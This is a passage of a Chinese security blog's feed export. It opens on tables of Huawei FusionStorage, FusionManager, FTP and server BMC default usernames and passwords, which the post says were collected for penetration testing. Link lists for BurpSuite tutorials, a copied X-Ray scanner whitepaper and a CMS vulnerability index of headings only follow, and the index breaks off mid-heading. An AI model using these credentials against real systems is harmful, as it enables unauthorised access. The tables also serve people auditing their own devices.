title="FusionStorage对外提供的Rest接口帐户"></a>FusionStorage对外提供的Rest接口帐户</h2><table><thead><tr><th></th><th>默认账户</th></tr></thead><tbody><tr><td>FusionStorage对其他Rest接口帐户提供的接口帐户</td><td>用户名：admin密码：Huawei@123</td></tr><tr><td>FusionStorage对健康检查工具提供的接口帐户</td><td>用户名：healthycheckadmin密码：hcHuawei@123</td></tr><tr><td>FusionStorage对CLI命令行界面提供的接口帐户</td><td>用户名：cmdadmin密码：cmdHuawei@123</td></tr><tr><td>FusionStorage对升级补丁提供的接口帐户</td><td>用户名：upadmin密码：upHuawei@123</td></tr><tr><td>FusionStorage预留的Rest接口帐户</td><td>用户名：rsadmin密码：rsHuawei@123</td></tr><tr><td>FusionStorage对HA机制提供的接口帐户</td><td>用户名：haadmin密码：haHuawei@123</td></tr><tr><td>FusionStorage对OMM内部模块提供的接口帐户</td><td>用户名：systemman密码：Admin@123</td></tr><tr><td>FusionStorage对FusionCompute提供的接口帐户</td><td>用户名：geadmin密码：geHuawei@123</td></tr></tbody></table><h1 id="0x05-FusionManager访问硬件设备的帐户"><a href="#0x05-FusionManager访问硬件设备的帐户" class="headerlink" title="0x05 FusionManager访问硬件设备的帐户"></a>0x05 FusionManager访问硬件设备的帐户</h1><table><thead><tr><th></th><th>默认账户</th></tr></thead><tbody><tr><td>FusionManager访问主机操作系统的帐户</td><td>用户名：gandalf密码：Pwd8800_magic$</td></tr><tr><td>FusionManager访问主机BMC的帐户</td><td>用户名：uhmroot密码：UhmRoot@2012</td></tr><tr><td>FusionManager访问机框的帐户</td><td>用户名：uhmroot密码：UhmRoot@2012</td></tr><tr><td>FusionManager访问存储设备的帐户</td><td>用户名：uhmroot密码：UhmRoot@2012</td></tr><tr><td>FusionManager访问交换机的帐户</td><td>用户名：uhmroot密码：UhmRoot@2012</td></tr></tbody></table><h1 id="0x06-FTP账户"><a href="#0x06-FTP账户" class="headerlink" title="0x06 FTP账户"></a>0x06 FTP账户</h1><table><thead><tr><th></th><th>默认账户</th></tr></thead><tbody><tr><td>FusionCompute下发CNA、Tools补丁到主机上的帐户</td><td>用户名：ftppatchuser密码：Patch_123</td></tr><tr><td>日志服务器FTP帐户</td><td>用户名：cnalog密码：1q2w3e~!</td></tr></tbody></table><h1 id="0x07-硬件设备账户"><a href="#0x07-硬件设备账户" class="headerlink" title="0x07 硬件设备账户"></a>0x07 硬件设备账户</h1><table><thead><tr><th>账户说明</th><th>默认账户</th></tr></thead><tbody><tr><td>E6000服务器刀片BMC系统帐户</td><td>用户名：root密码：root</td></tr><tr><td>E6000服务器管理模块帐户</td><td>用户名：root密码：huaweiosta</td></tr><tr><td>E9000服务器刀片BMC系统帐户</td><td>用户名：root密码：Huawei12#$</td></tr><tr><td>E9000服务器管理模块帐户</td><td>用户名：root密码：Huawei12#$</td></tr><tr><td>IP SAN存储管理系统帐户</td><td>用户名：admin密码：Admin@storage</td></tr></tbody></table><h1 id="0x08-参考文档"><a href="#0x08-参考文档" class="headerlink" title="0x08 参考文档"></a>0x08 参考文档</h1><p><a href="http://support.huawei.com/enterprise/docinforeader!loadDocument1.action?contentId=DOC1000028274&amp;partNo=10062" target="_blank" rel="noopener">http://support.huawei.com/enterprise/docinforeader!loadDocument1.action?contentId=DOC1000028274&amp;partNo=10062</a></p><p>### </p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;弱口令是渗透测试中的一个非常常见也非常严重的一个漏洞，很多系统被入侵脱裤是从一个弱口令爆破成功开始的。这里记录一下华为设备的一些默认弱口令，为了方便以后自己查阅使用。&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;img&quot; data-src=&quot;https://img03.sogoucdn.com/app/a/100520093/e18d20c94006dfe0-9eef65073f0f6be0-1760dba9c1e181b0964c091e0af19e63.jpg&quot; class=&quot;lozad&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="社会工程" scheme="https://www.mad-coding.cn/categories/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B/"/>
    
    
      <category term="社工" scheme="https://www.mad-coding.cn/tags/%E7%A4%BE%E5%B7%A5/"/>
    
  </entry>
  
  <entry>
    <title>burpsuite专题学习指南</title>
    <link href="https://www.mad-coding.cn/2019/10/15/burpsuite%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0%E6%8C%87%E5%8D%97/"/>
    <id>https://www.mad-coding.cn/2019/10/15/burpsuite专题学习指南/</id>
    <published>2019-10-15T13:25:44.000Z</published>
    <updated>2019-10-16T02:54:19.861Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><a id="more"></a><h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><p><a href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247484189&idx=1&sn=6c5873495cc2c174b0db3ced494cbce1&chksm=ec1f5622db68df34503f9a0410d83efc367f5da3c5d9264cb64e9f6f2577c12c4a59f36e68db&scene=21#wechat_redirect" target="_blank" rel="noopener">BurpSuite系列(一)—-Proxy模块(代理模块)</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247484192&idx=1&sn=998ae5b52c071ecc7234fffb6e58a690&chksm=ec1f561fdb68df09b3aee7a1751659fcf1f9e8f739d9fd3d5fb59ef24f2c4b53e565c8079348&scene=21#wechat_redirect" target="_blank" rel="noopener">BurpSuite系列(二)—-Target模块(目标模块)</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247484195&idx=1&sn=0e054c30f5c14ffc012678c26326d46f&chksm=ec1f561cdb68df0a37f4aec1150dbcad5c7b2c0b294cfe4490349d802178fd26a05ff8d05d56&scene=21#wechat_redirect" target="_blank" rel="noopener">BurpSuite系列(三)—-Spider模块(蜘蛛爬行)</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247484213&idx=1&sn=e9eea6b651e5d39b2a1d9a373db97ea6&chksm=ec1f560adb68df1cc5a14040d8a7c1783ba9098f01d7499bf15d20eb1de50449d2a2d39634ef&scene=21#wechat_redirect" target="_blank" rel="noopener">BurpSuite系列(四)—-Scanner模块(漏洞扫描)</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247484215&idx=1&sn=56368486f712b349113c11c9d5139d92&chksm=ec1f5608db68df1ebef0fcc0870bbcaa8f7b03b178dcdcebd0e6d33d3ea74fd397419ac6a4d1&scene=21#wechat_redirect" target="_blank" rel="noopener">BurpSuite系列(五)—-Intruder模块(暴力破解)</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247484216&idx=1&sn=345bcb5cd8b598a6b5b2b792c374a78f&chksm=ec1f5607db68df11317d09f8dc06966cec1679b182760ea09848e8692546de19e641e81f8272&scene=21#wechat_redirect" target="_blank" rel="noopener">BurpSuite系列(六)—-Repeater模块(中继器)</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247484217&idx=1&sn=855efefe772c27635c5fb3d993d331fa&chksm=ec1f5606db68df106caa857983d65168a6168ba7090327ef540213f5b97e28af5f85994d21e9&scene=21#wechat_redirect" target="_blank" rel="noopener">BurpSuite系列(七)—-Sequencer模块(定序器)</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247484218&idx=1&sn=7e863b2c0b02e188971bbe24055b2a2e&chksm=ec1f5605db68df134d14d971f06500a78eca76578a134f693b00f6e356dc425b4a92194d1ed1&scene=21#wechat_redirect" target="_blank" rel="noopener">BurpSuite系列(八)—-decoder模块(编码模块)</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247484218&idx=2&sn=6aadd3f1d183d59348ad7c1d446d5152&chksm=ec1f5605db68df130268ef885705122354e79f677be3c61f625ab54d9b2c77d58d7f3d253164&scene=21#wechat_redirect" target="_blank" rel="noopener">BurpSuite系列(九)—-Comparer模块(比较器)</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247484219&idx=1&sn=de0e90b15f8f774688ab198654e7e861&chksm=ec1f5604db68df1215920b3f8e1a05bbce557b821e1aa32de0a511f8b1a9ddd63fcee9ab869d&scene=21#wechat_redirect" target="_blank" rel="noopener">BurpSuite系列(十)—-Extender模块(扩展器)</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247484220&idx=1&sn=5c2c4b50fd0305ce06f86fdcbe50833c&chksm=ec1f5603db68df15800342dd58ecebb71318c901b86a1e73e510a22bd0964ddcfd2bec5423c5&scene=21#wechat_redirect" target="_blank" rel="noopener">BurpSuite系列(十一)—-Project options模块(项目选择)</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247484221&idx=1&sn=c7d96cfd3f44ddf7974bb0f5a666722a&chksm=ec1f5602db68df1445eb53adf08d3232e23a4a9f1f7a06608f2dd322e0cbda294a67ee1fe4df&scene=21#wechat_redirect" target="_blank" rel="noopener">BurpSuite系列(十二)—-User options模块(用户选择)</a></p><h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h1><h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h1><h1 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h1><p>### </p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;
    
    </summary>
    
      <category term="安全工具" scheme="https://www.mad-coding.cn/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="burpsuite" scheme="https://www.mad-coding.cn/tags/burpsuite/"/>
    
  </entry>
  
  <entry>
    <title>X-Ray白皮书</title>
    <link href="https://www.mad-coding.cn/2019/10/12/X-Ray%E7%99%BD%E7%9A%AE%E4%B9%A6/"/>
    <id>https://www.mad-coding.cn/2019/10/12/X-Ray白皮书/</id>
    <published>2019-10-12T09:34:48.000Z</published>
    <updated>2019-11-15T08:28:46.139Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在之前介绍过一篇长亭科技开发的工具叫X-ray，今天在网上看到了这款工具的白皮书，为了防止以后找不到了，这里直接以文章的形式记录下来。如有侵权，请联系删除！</p><a id="more"></a><h1 id="0x01-如何有效进行安全评估？"><a href="#0x01-如何有效进行安全评估？" class="headerlink" title="0x01 如何有效进行安全评估？"></a>0x01 如何有效进行安全评估？</h1><p>70%的网站存在漏洞，可能导致资金被盗、用户隐私信息泄露、系统瘫痪等问题。<br>2017年全球泄露或被盗的数据超过50亿条，其中仅上半年就达到19亿条，超过<br>了2016年全年被盗数据总量。CNNVD公布的2017年漏洞数量为14,748个，2016年<br>全年的漏洞总数为8,753个，年增长率达到了70%。面对逐年激增的漏洞与信息泄露事件，企业必须建立一套完善的安全评估系统。而企业目前所面临的安全评估或多或少都存在着一些问题。<br>【资产发现难】<br>• 企业规模不断扩大，难以审计大量新设备；<br>• 员工自带设备（BYOD）存在各种隐形威胁；<br>• 各种小实验室、小型办公网络难以监控。<br>【扫描能力弱】<br>• 爬虫能力弱，难以发现内网服务、设备存在的安全问题或未修复的漏洞；<br>• 无法自动发现扫描目标，无法自定义扫描资产、漏洞类型，用户体验差。<br>应急响应无力：<br>• 漏洞爆发，无法在极短时间内对整个内网的大规模设备群进行清查。<br>伸缩与扩展性差：<br>• 只能在部署时既定的区域内进行扫描工作，无法应对不断变化的企业内网环境。<br>• 在不同的网络之间扫描可能会带来冲突，实际使用效率大打折扣。</p><h1 id="0x02-X-Ray安全评估系统"><a href="#0x02-X-Ray安全评估系统" class="headerlink" title="0x02 X-Ray安全评估系统"></a>0x02 X-Ray安全评估系统</h1><p>（X-Ray）是由长亭安全团队基于扎实攻防经验，历经多年实战打磨的一款集合资产管理、Web扫描、主机扫描为一体的安全评估系统。<br>X-Ray安全评估系统，将人工检测漏洞的思维路径转化成机器语言，X-Ray实现了自动化精准漏洞识别，可发现大规模资产并进行方便快捷管理，同时提供详细的漏洞信息及修复策略，快速、全面地修复系统漏洞。</p><h2 id="2-1-高度自定义，扫描深度隐藏漏洞"><a href="#2-1-高度自定义，扫描深度隐藏漏洞" class="headerlink" title="2.1 高度自定义，扫描深度隐藏漏洞"></a>2.1 高度自定义，扫描深度隐藏漏洞</h2><p>（X-Ray）提供主机扫描和Web扫描功能，企业可以定期对网络进行扫描，帮助及时发现威胁，客观评估风险等级，根据扫描结果修复安全漏洞，在攻击者发起攻击前做到防患于未然。<br>企业网络环境不断更新迭代，一成不变的扫描方法显然不能应对层出不穷的安全威胁。企业需要一个可以灵活定制的安全评估系统，根据自身需求调整扫描策略。（X-Ray）提供丰富的自定义功能模板，用户可选择单个或自由组合扫描模块，真正实现高度自定义扫描，尽可能从交叉维度更全面地发现安全问题。<br>同时，为了应对不同的网络环境和内部管理需求，X-Ray可实现多工作区管理，支持对网络、部门、个人三个层面进行逻辑隔离：同一个用户可以在多个不同的工作区之间切换，不同的用户可以共享一个工作区达到协同工作的目的。在扫描过程中，每个扫描任务独立进行，扫描速度不受网站复杂程度影响。</p><h2 id="2-2-主机扫描"><a href="#2-2-主机扫描" class="headerlink" title="2.2 主机扫描"></a>2.2 主机扫描</h2><p>X-Ray可对主机或者网段进行扫描，识别其中存活的主机以及开放的端口，并通过对端口进行指纹识别，获取端口的协议、服务、应用等信息，进而制定扫描策略。<br>扫描过程中，X-Ray利用对应的POC进行测试，找出主机中存在的漏洞，扫描结果输出资产及漏洞信息。长亭漏洞库由安全团队专人维护，实时更新高质量漏洞，保证发现率，出现新漏洞时能做到迅速响应以避免损失。</p><h2 id="2-3-Web扫描"><a href="#2-3-Web扫描" class="headerlink" title="2.3 Web扫描"></a>2.3 Web扫描</h2><p>X-Ray支持通过收集网站信息，对网站结构进行建模，根据数据信息发起漏洞探测，从而确定网站可能遭受的风险。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162728.png" class="lozad"></p><p>（X-Ray）提供多种模式的爬虫扫描，包括普通爬虫和模拟浏览器的爬虫，<br>完美支持Web2.0网站、H5页面、单页网页应用、前后端网页应用等，并能模拟客户端发出的请求，动态解析javascript及动态渲染DOM结构。<br>同时，用户可利用请求调度引擎，根据需求调整HTTP请求的参数和速率，根据<br>网站情况自由控制扫描速度，既不会因为扫描太快影响业务导致系统瘫痪，也不会因为速度太慢影响扫描需求。<br>目前，X-Ray除了能覆盖主流常见的各漏洞类型，还支持检测XSS、SQL注入、敏感信息泄露、任意跳转、Web登录表单的爆破五种高危漏洞。</p><h2 id="2-4-XSS漏洞检测"><a href="#2-4-XSS漏洞检测" class="headerlink" title="2.4 XSS漏洞检测"></a>2.4 XSS漏洞检测</h2><p>XSS漏洞检测包括GET参数、请求头部、POST参数，支持多种Content-Type的分析检测。通过对网页进行静态分析，过滤注入点从而降低误报率。通过对网页进行动态分析，判定需要基于网页渲染执行的XSS，降低漏报率，不遗漏任何漏洞。</p><h2 id="2-5-SQL注入漏洞检测"><a href="#2-5-SQL注入漏洞检测" class="headerlink" title="2.5 SQL注入漏洞检测"></a>2.5 SQL注入漏洞检测</h2><p>SQL注入漏洞检测包括GET参数、请求头部、POST参数，支持多种Con-<br>tent-Type的分析检测。运用基于响应时间、响应请求的文本特征与结构特征等维度的智能算法多方面判定漏洞，确保高发现率和低误报率。</p><h2 id="2-6-敏感信息泄露漏洞检测"><a href="#2-6-敏感信息泄露漏洞检测" class="headerlink" title="2.6 敏感信息泄露漏洞检测"></a>2.6 敏感信息泄露漏洞检测</h2><p>敏感信息泄露漏洞检测能够发现的信息有：<br>· 敏感文件：备份文件、源码仓库、后台登录页面、WebShell、临时文件等。<br>· 敏感信息：debug信息、报错信息、用户隐私信息等。<br>检测扫描敏感文件、敏感信息，依据返回包的相关特征智能判断是否存在信息泄<br>露，误报率较低。</p><h2 id="2-7-Web登录表单的爆破漏洞检测"><a href="#2-7-Web登录表单的爆破漏洞检测" class="headerlink" title="2.7  Web登录表单的爆破漏洞检测"></a>2.7  Web登录表单的爆破漏洞检测</h2><p>X-Ray通过对网页分别进行静态分析和动态分析，得出合法的表单认证请求，保证爆破过程正常进行，集成具有代表性的爆破字典和领先的爆破算法，能高效地完成爆破任务。</p><h1 id="0x03-从发现到修复，多维展示安全状态"><a href="#0x03-从发现到修复，多维展示安全状态" class="headerlink" title="0x03 从发现到修复，多维展示安全状态"></a>0x03 从发现到修复，多维展示安全状态</h1><p>X-Ray不仅能实时呈现扫描结果，并且可以展示多维、详细的漏洞信息，从不同角度体现风险情况，并给出建议修复方案，帮助企业全面掌握更丰富的安全状态。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162750.png" class="lozad"></p><p>不同需求的用户可从中得到对应的信息，以便快速理解逐个漏洞的危害与影响，<br>有效修复关键漏洞。<br>同时，依托长亭长期的高标准安全服务，X-Ray在发现漏洞后，第一时<br>间给出系列修复建议：</p><ol><li>紧急修复方案：无需用户参与，即可指导用户在WAF等安全防护产品上添加规则，及时避免损失。</li><li>应用升级策略：对于发生在成熟服务应用上的漏洞，查找应用版本提供升级信息，或及时打上补丁。</li><li>代码修复方案：提供代码修改信息，通过编程的方式彻底修复漏洞。X-Ray支持统一管理扫描发现的全部漏洞，根据漏洞状态跟踪全生命期，并同时促进修复的闭环，提升整个企业的安全性。漏洞管理功能可集中查看修复状态、安排复测工作，支持根据多种条件对漏洞进行筛选。</li></ol><h2 id="3-1-漏洞修复状态"><a href="#3-1-漏洞修复状态" class="headerlink" title="3.1 漏洞修复状态"></a>3.1 漏洞修复状态</h2><p>支持手动更改修复状态，对漏洞进行标记，可单独设置状态或批量操作，跟踪漏洞生命周期。</p><h2 id="3-2-漏洞复测"><a href="#3-2-漏洞复测" class="headerlink" title="3.2 漏洞复测"></a>3.2 漏洞复测</h2><p>系统即时或预设定时进行循环扫描，批量进行漏洞复测并验收漏洞修复状况。</p><h1 id="0x04-集中维护，轻松管理千万级资产"><a href="#0x04-集中维护，轻松管理千万级资产" class="headerlink" title="0x04 集中维护，轻松管理千万级资产"></a>0x04 集中维护，轻松管理千万级资产</h1><p>不同于传统扫描器对用户资产只能进行罗列展示，X-Ray的资产管理功能可以对资产进行一站式增加、删除、编辑、导出等操作，帮助用户从域名、主机、服务、网站、资产分布、风险分布等维度进行数据统计。对于同一资产，用户可与历史扫描结果对比，清晰了解不同资产的安全态势变化。<br>X-Ray支持从扫描结果自动导入资产，可以由管理员手动补充修正。资产分为域名、主机、服务、网站四类，每种资产都提供单独的管理方式，用户可根据企业需求选择分类，轻松管理千万级的大量资产，增强系统安全性，降低安全风险。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162804.png" class="lozad"></p><p>资产扫描完成后，管理功能支持根据域名、主机、服务、网站、操作系统版<br>本、资产安全状态等对资产列表进行统一管理，概括而言主要有以下三个方面的<br>特色：<br>    1） 不同资产单独管理以匹配企业需求，降低安全风险；<br>    2） 支持扫描发现资产和手动维护并行，可实现交叉处理从而提高管理效率；<br>    3） 实时更新资产信息，安全状态清晰明了。</p><p>#0x05策略级统计分析，提供全面决策依据</p><p>IT系统资产规模越来越大，风险资产、漏洞数量越来越多，如何从海量的风险数据中找到需要优先处理的问题，已经成为安全运维人员面临的一个难题。<br>X-Ray能够导出资产、漏洞、扫描结果等多项报告，每种报告提供丰富的报告模板，详细展示发现的信息。高度自定义生成的报告，辅助丰富的可视化效果，方便直观展示内容。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162815.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162826.png" class="lozad"></p><p>通过对发现的漏洞进行评分，标记危险等级，X-Ray能根据漏洞严重程度进行排序，快速定位具体漏洞，重点关注需要优先修复的问题。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162843.png" class="lozad"></p><h1 id="0x06-X-Ray安全评估系统优势"><a href="#0x06-X-Ray安全评估系统优势" class="headerlink" title="0x06 X-Ray安全评估系统优势"></a>0x06 X-Ray安全评估系统优势</h1><h2 id="6-1-高发现率，低误报率"><a href="#6-1-高发现率，低误报率" class="headerlink" title="6.1 高发现率，低误报率"></a>6.1 高发现率，低误报率</h2><p>X-Ray由长亭高质量的漏洞库和多个功能插件模块支撑，扫描质量高。不同于使用第三方漏洞库，长亭的漏洞库从多年攻防实战和安全服务项目经验中提炼而得，并由专人团队进行维护，更新速度快且质量高，大大提高了漏洞的发现率。同时，<br>X-Ray结合主动扫描和被动扫描两种方式，降低误报率，发现更隐蔽的漏洞。</p><h2 id="6-2-多维定位扫描结果"><a href="#6-2-多维定位扫描结果" class="headerlink" title="6.2 多维定位扫描结果"></a>6.2 多维定位扫描结果</h2><p>X-Ray全面展示资产信息和风险列表，最终输出详细的扫描评估结果，并给出建议修复方案。扫描结果从多个角度对漏洞进行描述，企业管理者可迅速获知企业安全的薄弱环节，制定针对性的安全策略，安全运维人员则可获取详细的技术信息，为后期修复提供支持。</p><h2 id="6-3-不影响业务运转"><a href="#6-3-不影响业务运转" class="headerlink" title="6.3 不影响业务运转"></a>6.3 不影响业务运转</h2><p>在扫描过程中，漏洞检测必须做到安全有效，否则可能会对扫描目标产生不可恢<br>复的影响。X-Ray从三个方面进行控制，实现精准扫描的同时不影响业务：<br>1）核心扫描技术由长亭经验丰富的安全团队提供，确保扫描过程中使用完全无<br>害且能确认漏洞的Payload。<br>2）智能识别并绕过可能对业务产生副作用的API。<br>3）通过智能探测或手动调整的方式合理控制扫描速度，确保不对业务产生压力。</p><h2 id="6-4开放API方便集成使用"><a href="#6-4开放API方便集成使用" class="headerlink" title="6.4开放API方便集成使用"></a>6.4开放API方便集成使用</h2><p>X-Ray以Open API的方式提供所有功能，可以方便地被自动化调用，<br>同时能够与其他安全产品（如SOC、SIEM、JIRA、Redmine等）整合。<br>当行业爆发0day漏洞时，长亭应急响应团队会快速跟进，分析漏洞产生的原因，<br>在极短时间内提供POC扫描插件，用户只需要上传扫描插件，即可对0day漏洞进行<br>全面检查，保障企业网络安全。<br>X-Ray还支持一键导入长亭渗透测试报告，跟进漏洞的全生命周期，促<br>进漏洞修复。</p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;在之前介绍过一篇长亭科技开发的工具叫X-ray，今天在网上看到了这款工具的白皮书，为了防止以后找不到了，这里直接以文章的形式记录下来。如有侵权，请联系删除！&lt;/p&gt;
    
    </summary>
    
      <category term="神兵利器" scheme="https://www.mad-coding.cn/categories/%E7%A5%9E%E5%85%B5%E5%88%A9%E5%99%A8/"/>
    
    
      <category term="X-RAY" scheme="https://www.mad-coding.cn/tags/X-RAY/"/>
    
  </entry>
  
  <entry>
    <title>CMS漏洞集合</title>
    <link href="https://www.mad-coding.cn/2019/10/12/CMS%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/"/>
    <id>https://www.mad-coding.cn/2019/10/12/CMS漏洞集合/</id>
    <published>2019-10-12T02:24:53.000Z</published>
    <updated>2019-10-12T03:30:04.526Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在渗透测试的过程中，会碰到各种CMS搭建的网站，为了积累自己的经验，决定将每种CMS爆出的漏洞整理成文章，这样既方便自己查看，也可以分享给需要的人，大家共同讨论，进步。</p><a id="more"></a><h1 id="0x01-DedeCMS"><a href="#0x01-DedeCMS" class="headerlink" title="0x01 DedeCMS"></a>0x01 DedeCMS</h1><h2 id="1-1-DedeCMS-v5-7-shops-delivery-存储型XSS"><a href="#1-1-DedeCMS-v5-7-shops-delivery-存储型XSS" class="headerlink" title="1.1 DedeCMS_v5.7_shops_delivery_存储型XSS"></a>1.1 DedeCMS_v5.7_shops_delivery_存储型XSS</h2><h2 id="1-2-DedeCMS-v5-7-carbuyaction-存储型XSS"><a href="#1-2-DedeCMS-v5-7-carbuyaction-存储型XSS" class="headerlink" title="1.2 DedeCMS_v5.7_carbuyaction_存储型XSS"></a>1.2 DedeCMS_v5.7_carbuyaction_存储型XSS</h2><h2 id="1-3-DedeCMS-v5-7-友情链接CSRF-GetShell"><a href="#1-3-DedeCMS-v5-7-友情链接CSRF-GetShell" class="headerlink" title="1.3 DedeCMS_v5.7_友情链接CSRF_GetShell"></a>1.3 DedeCMS_v5.7_友情链接CSRF_GetShell</h2><h2 id="1-4-DedeCMS-V5-7-SP2后台存在代码执行漏洞"><a href="#1-4-DedeCMS-V5-7-SP2后台存在代码执行漏洞" class="headerlink" title="1.4 DedeCMS V5.7 SP2后台存在代码执行漏洞"></a>1.4 DedeCMS V5.7 SP2后台存在代码执行漏洞</h2><h1 id="0x02-Discuz"><a href="#0x02-Discuz" class="headerlink" title="0x02 Discuz"></a>0x02 Discuz</h1><h2 id="2-1-Discuz-＜3-4-birthprovince-前台任意文件删除"><a href="#2-1-Discuz-＜3-4-birthprovince-前台任意文件删除" class="headerlink" title="2.1 Discuz_＜3.4_birthprovince_前台任意文件删除"></a>2.1 Discuz_＜3.4_birthprovince_前台任意文件删除</h2><h1 id="0x03-Drupal"><a href="#0x03-Drupal" class="headerlink" title="0x03 Drupal"></a>0x03 Drupal</h1><h2 id="3-1-Drupal远程代码执行漏洞-CVE-2017-6920"><a href="#3-1-Drupal远程代码执行漏洞-CVE-2017-6920" class="headerlink" title="3.1 Drupal远程代码执行漏洞(CVE-2017-6920)"></a>3.1 Drupal远程代码执行漏洞(CVE-2017-6920)</h2><h1 id="0x04-Ecshop"><a href="#0x04-Ecshop" class="headerlink" title="0x04 Ecshop"></a>0x04 Ecshop</h1><h1 id="0x05-FineCMS"><a href="#0x05-FineCMS" class="headerlink" title="0x05 FineCMS"></a>0x05 FineCMS</h1><h2 id="5-1-FineCMS最新版5-0-8两处getshell"><a href="#5-1-FineCMS最新版5-0-8两处getshell" class="headerlink" title="5.1 FineCMS最新版5.0.8两处getshell"></a>5.1 FineCMS最新版5.0.8两处getshell</h2><h1 id="0x06-Joomla"><a href="#0x06-Joomla" class="headerlink" title="0x06 Joomla"></a>0x06 Joomla</h1><h2 id="6-1-Joomla-3-7-0-SQL注入-CVE-2017-8917"><a href="#6-1-Joomla-3-7-0-SQL注入-CVE-2017-8917" class="headerlink" title="6.1 Joomla_3.7.0_SQL注入(CVE-2017-8917)"></a>6.1 Joomla_3.7.0_SQL注入(CVE-2017-8917)</h2><h2 id="6-2-Joomla-3-4-4-3-6-3-未授权创建特权用户-CVE-2016-8869"><a href="#6-2-Joomla-3-4-4-3-6-3-未授权创建特权用户-CVE-2016-8869" class="headerlink" title="6.2 Joomla_3.4.4-3.6.3_未授权创建特权用户(CVE-2016-8869)"></a>6.2 Joomla_3.4.4-3.6.3_未授权创建特权用户(CVE-2016-8869)</h2><h1 id="0x07-Metinfo"><a href="#0x07-Metinfo" class="headerlink" title="0x07 Metinfo"></a>0x07 Metinfo</h1><h1 id="0x08-PHPCMS"><a href="#0x08-PHPCMS" class="headerlink" title="0x08 PHPCMS"></a>0x08 PHPCMS</h1><h2 id="8-1-PHPCMS-v9-6-0-SQL注入"><a href="#8-1-PHPCMS-v9-6-0-SQL注入" class="headerlink" title="8.1 PHPCMS_v9.6.0_SQL注入"></a>8.1 PHPCMS_v9.6.0_SQL注入</h2><h2 id="8-2-PHPCMS-v9-6-0-任意文件上传"><a href="#8-2-PHPCMS-v9-6-0-任意文件上传" class="headerlink" title="8.2 PHPCMS_v9.6.0_任意文件上传"></a>8.2 PHPCMS_v9.6.0_任意文件上传</h2><h2 id="8-3-PHPCMS-v9-6-1-任意文件下载"><a href="#8-3-PHPCMS-v9-6-1-任意文件下载" class="headerlink" title="8.3 PHPCMS_v9.6.1_任意文件下载"></a>8.3 PHPCMS_v9.6.1_任意文件下载</h2><h2 id="8-4-PHPCMS-v9-6-2-任意文件下载"><a href="#8-4-PHPCMS-v9-6-2-任意文件下载" class="headerlink" title="8.4 PHPCMS_v9.6.2_任意文件下载"></a>8.4 PHPCMS_v9.6.2_任意文件下载</h2><h1 id="0x09-Struts"><a href="#0x09-Struts" class="headerlink" title="0x09 Struts"></a>0x09 Struts</h1><h2 id="9-1-S2-048-CVE-CVE-2017-9791"><a href="#9-1-S2-048-CVE-CVE-2017-9791" class="headerlink" title="9.1 S2-048(CVE-CVE-2017-9791)"></a>9.1 S2-048(CVE-CVE-2017-9791)</h2><h1 id="0x10-ThinkPHP"><a href="#0x10-ThinkPHP" class="headerlink" title="0x10 ThinkPHP"></a>0x10 ThinkPHP</h1><h2 id="10-1-ThinkPHP-3-2-3-5-0-10-缓存函数设计缺陷"><a href="#10-1-ThinkPHP-3-2-3-5-0-10-缓存函数设计缺陷" class="headerlink" title="10.1 